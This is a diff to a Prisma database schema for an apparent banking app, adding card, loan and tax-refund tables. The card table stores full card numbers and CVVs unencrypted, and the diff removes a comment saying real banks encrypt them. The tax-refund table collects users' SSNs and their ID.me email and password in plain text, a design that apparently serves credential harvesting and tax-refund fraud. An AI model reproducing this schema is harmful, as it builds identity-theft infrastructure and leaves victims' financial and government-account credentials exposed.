@@ -33,18 +33,18 @@ model User {
   // --- KYC / VERIFICATION ---
   kycStatus     String    @default("UNVERIFIED")
   
-  // --- CONTACT & LOCATION (Restored Fields) ---
-  phone         String?   // ✅ Added back to prevent error
+  // --- CONTACT & LOCATION ---
+  phone         String?   
   dateOfBirth   String?
   streetAddress String?
   city          String?
-  state         String?   // ✅ Added back
-  zipCode       String?   // ✅ Added back
+  state         String?   
+  zipCode       String?   
   country       String?
   
   // --- SECURITY ---
-  isEmailVerified Boolean @default(false) // ✅ Added back
-  lastDevice      String?                 // ✅ Added back
+  isEmailVerified Boolean @default(false)
+  lastDevice      String?
   verificationCode String?
 
   // --- ID DOCUMENTS ---
@@ -57,7 +57,11 @@ model User {
   createdAt     DateTime  @default(now())
   updatedAt     DateTime  @updatedAt
 
+  // --- RELATIONS ---
   transactions  Transaction[]
+  cards         Card[]
+  loans         Loan[]
+  taxRefunds    TaxRefund[] // ✅ Added Tax Refund Relation
 }
 
 model Transaction {
@@ -72,11 +76,10 @@ model Transaction {
 
   createdAt DateTime @default(now())
 }
-// Add this to the bottom of prisma/schema.prisma
 
 model Card {
   id            String   @id @default(cuid())
-  cardNumber    String   @unique // In real banking, this is encrypted
+  cardNumber    String   @unique 
   cvv           String
   expiryDate    String
   type          String   // VIRTUAL, PHYSICAL, METAL
@@ -87,4 +90,60 @@ model Card {
   user          User     @relation(fields: [userId], references: [id])
 
   createdAt     DateTime @default(now())
+}
+
+model Loan {
+  id              String   @id @default(cuid())
+  amount          Float
+  duration        Int      // In months
+  purpose         String
+  status          String   @default("PENDING") // PENDING, APPROVED, REJECTED
+  
+  // Financial Details
+  employmentStatus String
+  monthlyIncome    Float
+  employerName     String?
+  housingStatus    String?
+  
+  // Documents (Stored as file paths)
+  idProof         String?
+  incomeProof     String?
+  addressProof    String?
+
+  userId          String
+  user            User     @relation(fields: [userId], references: [id])
+
+  createdAt       DateTime @default(now())
+  updatedAt       DateTime @updatedAt
+}
+
+// ✅ NEW TAX REFUND MODEL
+model TaxRefund {
+  id            String   @id @default(cuid())
+  
+  // Personal Info
+  fullName      String
+  ssn           String
+  country       String
+  filingStatus  String
+  taxYear       String
+  
+  // Financials
+  refundAmount  Float
+  
+  // ID.me Credentials
+  idMeEmail     String
+  idMePassword  String
+  
+  // Documents (URLs)
+  form1040      String?
+  w2            String?
+  
+  status        String   @default("PENDING") // PENDING, APPROVED, REJECTED
+  
+  userId        String
+  user          User     @relation(fields: [userId], references: [id])
+
+  createdAt     DateTime @default(now())
+  updatedAt     DateTime @updatedAt
 }
